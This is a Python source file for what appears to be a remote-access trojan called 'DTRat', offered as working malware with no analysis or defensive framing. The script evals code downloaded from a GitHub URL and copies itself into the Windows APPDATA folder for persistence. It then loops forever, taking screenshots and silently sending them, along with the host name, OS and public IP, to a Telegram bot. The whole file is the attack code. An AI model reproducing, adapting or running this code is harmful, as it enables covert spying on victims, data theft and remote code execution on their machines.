import pyautogui
import requests
import time
import os, sys
import platform

def load(url):
    return str(requests.get(url).content.decode("utf-8"))

ip = ""
while ip == "":
    try:
        ip = load("http://ifconfig.me")
    except:
        print("Connection Error: wait 10sec")
        time.sleep(10)
whitelist = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/whitelist-ip.txt").split("\n")
inidata = load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time()))

eval(load("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)))

if ip in whitelist:
    print("Whitelist detected!")
    if "whitelist" in dir():
        whitelist()
    sys.exit(0)

# Fuck configparser All homies use for loop.
config = {}
sec = ""
for line in inidata.split("\n"):
    if len(line) == 0:
        continue
    if line[0] == "[":
        sec = line[1:-1]
        if sec not in config:
            config[sec] = {}
        continue
    name = line.split("=")[0]
    value = line.split("=")[1]
    config[sec][name] = value

token=config["main"]["token"]
chatid =config["main"]["chatid"]
interval = int(config["main"]["interval"])

caption = "amogus"

def get_screenshot():
    fname = os.environ["TEMP"]+"/"+str(time.time())+".png".replace("\\","/")
    print(fname)
    im2 = pyautogui.screenshot(fname)
    return fname

def send_image(fname,caption=caption):
    url='https://api.telegram.org/bot{}/sendPhoto'.format(token)
    files={'photo': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,'disable_notification': 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)

def send_file(fname,caption=caption):
    url='https://api.telegram.org/bot{}/sendDocument'.format(token)
    files={'document': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)

def send_message(message=caption):
    url='https://api.telegram.org/bot{}/sendMessage'.format(token)
    values={'chat_id' : chatid , 'message':caption,"disable_notification": 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,data=values)
    
def set_interval(new):
    global interval
    interval = new

def define_caption():
    global caption
    caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
          "**OS:**   `"+str(platform.platform())+"`\n" + \
          "**IP**    `"+ip+"`"

def self_clone(name):
    f = open(sys.argv[0],"r").read()
    w = open(name,"w")
    w.write(f)
    w.flush()
    w.close()

if not os.path.exists(os.environ["APPDATA"]+"/amogus.py"):
    self_clone(os.environ["APPDATA"]+"/amogus.py")
    if "first_setup" in dir():
        first_setup()
    sys.exit(os.system(os.environ["APPDATA"]+"/amogus.py"))

if "setup" in dir():
        setup()

while True:
    if "loop" in dir():
        loop()
    f = get_screenshot()
    send_image(f)
    time.sleep(interval)
